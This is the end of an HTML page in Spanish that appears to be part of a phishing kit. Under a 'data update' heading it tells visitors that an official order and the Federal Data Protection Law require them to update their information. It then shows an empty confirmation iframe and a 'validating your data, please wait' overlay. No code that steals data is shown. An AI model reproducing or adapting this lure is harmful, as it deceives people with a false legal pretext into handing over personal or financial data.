                            <td width="229">&nbsp;&nbsp;&nbsp;&nbsp;Actualización de datos</td>
                        </tr>
                        <tr class="tittabdat">
                            <td class="textabcg">
                                <p>&nbsp;&nbsp;Por disposición oficial y obedeciendo <br>&nbsp;&nbsp;a la Ley Federal de Protección de Datos <br>&nbsp;&nbsp;es necesario que actualice la siguente<br>&nbsp;&nbsp;información.</p>
                                <p align="center">&nbsp;</p>
                                <p align="center">
                                </p>
                            </td>
                        </tr>
                    </tbody>
                </table>
                <div>
                
                

                    <!----- TERMINA AVISO ------------->


                </div>
            </div>
        </div>
    </div>
</div>



<style>
        #divEmailConfirm {
            width: 40%;
            left: 30%;
            top: 2em;
            z-index: 10002;
            position: absolute;
            display: none;
            margin: 0 auto!important;
        }


        #backmodal {
            padding: 0;
            margin: 0;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            width: 100%;
            height: 100%;
            background: #595959 url(../../spacer.gif) center center;
            z-index: 1001;
            -moz-opacity: 0.8;
            opacity: 0.80;
            filter: alpha(opacity=80);
            display: none;
        }

        @media (min-width: 1200px){
            #divEmailConfirm {
                width: 40%;
                left: 30%;
                top: 2em;
            }
        }

        @media (min-width: 992px) and (max-width: 1199px){
            #divEmailConfirm {
                width: 60%;
                left: 30%;
                top: 3em;
            }
        }

        @media (min-width: 268px) and (max-width: 991px){
            #divEmailConfirm {
                width: 90%;
                left: 5%;
                top: 1em;
            }
        }
    </style>

    
    <div class="" id="divEmailConfirm" style="">
        <div id="cnt">
            <iframe id="iframeEmail" style="width: 100%; height: 550px" src=""></iframe>
            
        </div>
    </div>

    <div id="backmodal" class="simplemodal-overlay" style="background-color: #F8F8F8; opacity: 0.8; height: 1509px; width: 1280px; position: fixed; left: 0px; top: 0px; z-index: 1000000001;display:none;"></div>
    <div id="mensajeLoading" style="text-align: center;position: fixed;width: 50%; z-index: 1000000002; left: 25%; top: 20%; height: 327px;display:none;">
        <img src="25.gif" style="width: 150px;height: 150px;">
        <p style="font-weight: bold;font-family:Verdana, Arial, Helvetica, sans-serif;COLOR: #666666;">El sistema se encuentra validando sus datos.<br>Porfavor espere un momento...</p>
    </div>

    <!--<div class="ui-widget-overlay" style="width: 1280px; height: 850px; z-index: 1001;display:none;"> </div>-->
</body>

</html>
